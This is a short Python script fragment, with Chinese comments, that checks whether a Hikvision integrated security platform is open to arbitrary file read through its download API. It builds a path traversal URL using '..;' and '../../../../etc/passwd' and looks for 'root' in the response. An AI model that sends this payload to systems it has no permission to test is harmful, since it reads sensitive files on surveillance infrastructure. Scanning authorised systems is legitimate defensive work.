...
def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd"
        ...
        if response.status_code == 200 and 'root' in response.text:
            print(f"{RED}URL [{url}] 存在海康威视综合安防download任意文件读取漏洞。{RESET}")
        else:
...
def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在海康威视综合安防download任意文件读取漏洞。')
